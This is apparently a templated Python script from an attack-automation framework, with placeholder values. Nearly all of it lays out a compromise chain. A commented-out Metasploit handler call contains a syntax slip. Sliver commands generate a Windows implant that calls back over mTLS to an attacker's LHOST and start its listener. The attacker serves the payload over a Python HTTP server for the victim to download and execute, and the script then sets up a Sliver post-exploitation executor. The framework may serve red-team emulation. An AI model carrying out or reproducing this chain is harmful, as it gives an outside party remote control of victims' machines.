from attack_executor.config import load_config

config = load_config(config_file_path="/home/user/attack_executor/test/config.ini")

# from attack_executor.exploit.Metasploit import MetasploitExecutor
# metasploit_executor = MetasploitExecutor(config)
# metasploit_executor.exploit_and_execute_payload(
#                             target = None,
#                             exploit_module_name = "exploit/multi/handler",
#                             payload_module_name = "#{payload_name}"",
#                             listening_host = "#{LHOST}",
#                             listening_port = "#{LPORT}"):


"""
Executor:
Sliver Console
Command:
sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mlts --lport #{LPORT}

"""

"""
Executor:
Human
Command:
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Executet the payload file to #{PATH}

"""

"""
Executor:
None
Command:
None

"""

from attack_executor.post_exploit.Sliver import SliverExecutor
sliver_executor = SliverExecutor(config = config)
# sliver_executor.msf(#{SessionID}, \#{Payload}, \#{LHOST}, \#{LPORT})
